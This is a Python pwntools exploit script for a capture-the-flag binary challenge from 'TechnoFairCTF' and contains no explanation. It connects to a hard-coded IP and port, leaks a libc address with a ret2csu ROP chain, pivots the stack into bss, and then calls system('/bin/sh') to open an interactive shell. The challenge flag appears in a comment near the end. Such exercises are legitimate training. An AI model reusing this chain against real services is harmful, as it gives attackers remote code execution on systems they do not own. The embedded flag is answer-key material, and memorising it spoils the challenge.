#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 103.167.132.153 --port 55850 ./chall
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./chall')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '103.167.132.153'
port = int(args.PORT or 55850)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
b *0x401322
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x3fe000)
# RUNPATH:  '.'

io = start()

libc = ELF("./libc.so.6")

pop_rdi = 0x0000000000401393

pop_csu = 0x40138a
call_csu = 0x401370

def ret2csu(call_func, edi, rsi, rdx, rbx_a = 0, rbp_a = 1, r12_a = 0, r13_a = 0, r14_a = 0, r15_a = 0,pop_csu_on = 1):
    p_csu =''
    if pop_csu_on :
        p_csu = p64(pop_csu)
        p_csu += p64(0) # rbx
        p_csu += p64(0+1) # rbp
        p_csu += p64(edi) # r12
        p_csu += p64(rsi) # r13
        p_csu += p64(rdx) # r14
        p_csu += p64(call_func) # r15
    p_csu += p64(call_csu)
    p_csu += p64(0) #junk
    p_csu += p64(rbx_a) # rbx
    p_csu += p64(rbp_a) # rbp
    p_csu += p64(r12_a) # r12
    p_csu += p64(r13_a) # r13
    p_csu += p64(r14_a) # r14
    p_csu += p64(r15_a) # r15
    return p_csu

bss_write = exe.bss()+0x900
p = p64(exe.plt['puts'])
p += p64(0)
p += p64(pop_rdi)
p += p64(exe.got['puts'])
p += p64(exe.plt['puts'])
p += ret2csu(exe.got['read'],0,bss_write,0x50,rbp_a=bss_write-0x8)
p += p64(0x0000000000401329) # leave

io.recvuntil("code : ")
io.sendline(p)
io.recvline()
leak = u64(io.recvline()[:-1].ljust(8,"\x00"))
print(hex(leak))

libc.address = leak - libc.sym['puts']

pop_rsi = 0x0000000000401391
pop_rdx = libc.address + 0x0000000000119241

p = ''
p += p64(pop_rdi)
p += p64(next(libc.search("/bin/sh\x00")))
p += p64(pop_rsi)
p += p64(0)*2
p += p64(pop_rdx)
p += p64(0)*2
p += p64(libc.sym['system'])
# TechnoFairCTF{w0w_you're_s0_g00d_at_pWN__ggs!!!}

io.sendline(p)

io.interactive()

